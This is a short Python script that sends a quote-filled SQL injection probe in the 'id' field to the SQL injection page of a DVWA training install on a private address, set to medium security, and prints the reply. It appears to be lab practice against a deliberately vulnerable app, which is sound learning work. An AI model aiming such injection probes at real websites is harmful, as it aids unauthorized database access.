import requests


data = 'id=1"a\'b"c\'d""&Submit=Submit'
headers = {'cookie': 'security=medium; PHPSESSID=moreos061jjhfrnirbdblbat83','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0','Content-Type':'application/x-www-form-urlencoded'}
url = 'http://10.246.190.63/DVWA-master/vulnerabilities/sqli/'
html = requests.post(url,headers=headers,data=data).text
print(html)